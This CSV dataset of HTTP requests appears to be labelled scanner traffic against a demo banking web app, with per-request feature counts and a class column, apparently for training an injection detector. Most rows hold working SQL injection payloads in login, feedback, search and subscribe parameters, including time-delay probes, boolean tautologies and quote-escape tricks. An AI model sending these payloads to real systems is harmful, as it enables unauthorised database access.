method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=Submit&cfile=if(now()=sysdate()%2csleep(6)%2c0)&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,4,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI=&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=q7DBgxM7');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1acutfzNCSoW1D,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,2,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1);%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,0,2,2
GET,/search.jsp?query=JyI=,,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b846-846-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
GET,/status_check.jsp,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,0,2,2
GET,/survey_questions.jsp?step=%40%40QfycK,,0,0,0,0,0,0,2
GET,/search.jsp?query=kQBPGvPq'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b994-994-1=0%2b0%2b0%2b1&uid=1,0,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=SbbrQwLv';select%20pg_sleep(3);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40JlOll&subject=1,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=b'%20AND%202*3*8=6*8%20AND%20't3Gu'='t3Gu,,4,0,0,0,4,0,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/",2,2,0,15,0,10,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=%bf'%bf""&uid=1",1,1,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/doLogin,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=wY8BoZgN';%20waitfor%20delay%20'0:0:6'%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,3,0,1,0,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst""%20AND%202*3*8=6*8%20AND%20""DtiX""=""DtiX&name=tmtqptlo&subject=1",0,4,0,0,0,0,2
GET,/search.jsp?query=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,,2,0,0,5,0,1,2
GET,/survey_questions.jsp,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,2
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b841-841-1=0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=,0,0,0,0,0,1,2
GET,/index.jsp?content=if(now()=sysdate()%2csleep(3)%2c0),,0,0,0,4,0,1,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000658=000658%20AND%203%2b1-1-1=1%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1;%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1;select%20pg_sleep(6);%20--%20,0,0,1,1,0,2,2
GET,/index.jsp?content=1acu4FD6DWGRlv,,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=1'""&uid=1",1,1,0,0,0,1,2
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/&name=tmtqptlo&subject=1",2,2,0,15,0,9,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%40%40rMItJ,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select(0)from(select(sleep(15)))v)/*'%2b(select(0)from(select(sleep(15)))v)%2b'""%2b(select(0)from(select(sleep(15)))v)%2b""*/&subject=1",2,2,0,15,0,9,2
GET,/survey_questions.jsp?step=-1%20OR%203%2b617-617-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
GET,/util/serverStatusCheckService.jsp?HostName=07IBond6';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%20waitfor%20delay%20'0:0:15'%20--%20&subject=1,2,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1));select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=E666qViV');select%20pg_sleep(9);%20--%20&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
GET,/util/serverStatusCheckService.jsp?HostName=iotFIHfe,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1'""&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=LKi1XNVa';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b91-91-1=0%2b0%2b0%2b1%20--%20&subject=1,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2%252527%252522&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/search.jsp?query=-1%20OR%203%2b84-84-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%40S3HFf&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=aqWnMQPk';%20waitfor%20delay%20'0:0:5'%20--%20&subject=1,3,0,1,0,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=vtTeCvhp';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,0,3,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b539-539)%20--%20&name=tmtqptlo&subject=1,0,0,1,1,0,0,2
GET,/index.jsp?content=vLv93ISt,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=DuI162bQ';%20waitfor%20delay%20'0:0:3'%20--%20,3,0,1,0,0,2,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0""""",2,2,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=%5c,,0,0,0,0,0,0,2
GET,/index.jsp?content=C84o1Oiw';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%f0''%f0""""&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",2,2,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b658-658-1=0%2b0%2b0%2b1%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1""%20OR%202%2b282-282-1=0%2b0%2b0%2b1%20--%20&subject=1",0,1,1,0,0,0,2
GET,/search.jsp?query=-1%20OR%202%2b84-84-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2csleep(6)%2c0),0,0,0,4,0,1,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf""",1,1,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&name=tmtqptlo&subject=1",0,2,0,5,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=-1""%20OR%202%2b883-883-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,1,1,0,0,0,2
GET,/search.jsp?query=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
GET,/index.jsp?content=jm9PzrF5'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=aEVGpYKF';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,3,0,1,0,0,2,2
GET,/index.jsp?content=JyI=,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=oQDgWGn4&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b593-593)%20or%20'B23siZtz'='&uid=1,4,0,0,1,0,1,2
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,2
GET,/pr,,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b539-539-1=0%2b0%2b0%2b1%20--%20&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%bf'%bf""&subject=1",1,1,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=hrcbkxgn&subject=1acujeUgsv17wx,0,0,0,0,0,0,2
GET,/search.jsp?query=-1));select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,2
GET,/swagger/properties.json,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0'XOR(if(now()=sysdate()%2csleep(5)%2c0))XOR'Z&subject=1,2,0,0,5,0,1,2
GET,/search.jsp?query=1acusUU6Fn3z1x,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,0,3,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1%20OR%202%2b956-956-1=0%2b0%2b0%2b1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1'""",1,1,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1'%20OR%202%2b542-542-1=0%2b0%2b0%2b1%20or%20'EGoP34LN'=',4,0,0,0,0,0,2
GET,/high_yield_investments.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b493-493-1=0%2b0%2b0%2b1%20--%20&subject=1,1,0,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,0,5,0,1,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,1,2
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,2
GET,/index.jsp?content=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b539-539)%20--%20&name=tmtqptlo&subject=1,0,0,1,1,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b696-696-1=0%2b0%2b0%2b1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b692-692-1=0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,0,1,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=-1""%20OR%202%2b752-752-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,0,0,2
GET,/survey_questions.jsp?step=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b869-869-1=0%2b0%2b0%2b1&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=JyI=,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=%f0''%f0""""&uid=1",2,2,0,0,0,1,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1""%20OR%202%2b711-711-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b593-593)%20or%20'B23siZtz'='&uid=1,4,0,0,1,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,0,5,0,1,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b81-81-1=0%2b0%2b0%2b1%20or%20'BbWBD7IE'='&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=eaU7ryhL'));select%20pg_sleep(6);%20--%20,1,0,1,1,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(9);%20--%20,0,0,1,1,0,3,2
GET,/survey_questions.jsp?step=JyI=,,0,0,0,0,0,0,2
GET,/sendFeedback,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=4uDOCtnB';select%20pg_sleep(9);%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0""""&name=rtlrpggp&subject=1",2,2,0,0,0,0,2
GET,/survey_questions.jsp?step=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,2
GET,/survey_questions.jsp?step=4cEn7HUj');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2